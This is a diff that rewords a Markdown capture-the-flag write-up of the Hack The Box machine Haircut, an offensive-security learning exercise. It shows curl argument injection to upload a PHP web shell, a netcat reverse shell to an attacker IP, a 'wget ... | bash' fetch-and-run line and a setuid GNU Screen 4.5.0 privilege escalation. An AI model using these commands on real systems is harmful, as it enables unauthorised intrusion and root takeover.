@@ -31,25 +31,25 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Checking HTTP (Port 80)
 
-On the web page we only see a photo of a person and nothing interesting in the source.
+On the web page there is a photo of a person and nothing interesting in the source.
 Lets search for hidden paths and PHP files with **Gobuster**:
 ```markdown
 gobuster -u http://10.10.10.24/ -w dir /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
 ```
 
-We get back the path _/uploads_ with HTTP Code 403 Forbidden, a page _/test.html_, where its a picture of hair and _/exposed.php_ where we see this:
+The responses are the path _/uploads_ with HTTP Code 403 Forbidden, a page _/test.html_, where its a picture of hair and _/exposed.php_ where we see this:
 
 ![Exposed page](https://kyuu-ji.github.io/htb-write-up/haircut/haircut_web-1.png)
 
-When we click on _Go_, we get back the _test.html_ site.
+When clicking on _Go_, it gets back the _test.html_ site.
 If we start a web server and input the IP of our server in there it tries to connect to us.
 
 Trying special characters like semicolon and pipes get filtered with a warning, that those characters can't be used.
-By inputting anything into the field, we get the an error from `curl`:
+By inputting anything into the field, it displays an error from `curl`:
 
 ![Curl identified](https://kyuu-ji.github.io/htb-write-up/haircut/haircut_web-2.png)
 
-This means this sends a `curl` command to get the files and this is what we want to abuse.
+This means that this application sends a `curl` command to get the files.
 Lets send this to _Burpsuites Repeater_ to try some things with _cURL_.
 
 ### Getting a reverse shell
@@ -59,7 +59,7 @@ We can try to put parameters of _cURL_ in there:
 formurl=--version&submit=Go
 ```
 
-This works and gives us the version number of cURL, so lets try to upload something on the _/uploads_ directory with it.
+This works and displays the version number of cURL, so lets try to upload something on the _/uploads_ directory with it.
 ```markdown
 formurl=-o uploads/test.html http://10.10.14.23:8000/test.html&submit=Go
 ```
@@ -75,7 +75,7 @@ Now we can request the file with the command `whoami` to test it:
 GET /uploads/shell.php?cmd=whoami HTTP/1.1
 ```
 
-This works and we can send a command to start a reverse shell on the box.
+This works and it is possible to send a command to start a reverse shell on the box.
 ```markdown
 GET /uploads/shell.php?cmd=nc -e /bin/sh 10.10.14.23 9001 HTTP/1.1
 ```
@@ -84,7 +84,7 @@ We are on the box as _www-data_.
 
 ## Privilege Escalation
 
-We will execute any Linux enumeration script to get an attack surface:
+Now executing any Linux enumeration script to get an attack surface:
 ```markdown
 wget http://10.10.14.23:8000/LinEnum.sh | bash
 ```
@@ -94,7 +94,7 @@ Looking for binaries with the _Setuid bit_ enabled:
 find / -perm -4000 2>/dev/null | xargs ls -la
 ```
 
-The binay `screen` has the setuid bit set and explicitly the version number 4.5.0 displayed which has a privilege escalation vulnerability that we will exploit. The explanation for this exploit can be found through `searchsploit screen` on the **GNU Screen 4.5.0 - Local Privilege Escalation (PoC)** exploit.
+The binay `screen` has the setuid bit set and explicitly the version number 4.5.0 displayed which has a privilege escalation vulnerability. The explanation for this exploit can be found through `searchsploit screen` on the **GNU Screen 4.5.0 - Local Privilege Escalation (PoC)** exploit.
 
 For this we need to create some files first. They are in this folder.
 - libhax.c:
@@ -107,7 +107,7 @@ gcc rootshell.c -o rootshell
 gcc -fPIC -shared -ldl -o libhax.so libhax.c
 ```
 
-Now we created the Shared object file _libhax.so_ and the binary _rootshell_.
+This created the Shared object file _libhax.so_ and the binary _rootshell_.
 
 Executing these commands one after another and in the end executing the _rootshell_ binary:
 ```markdown
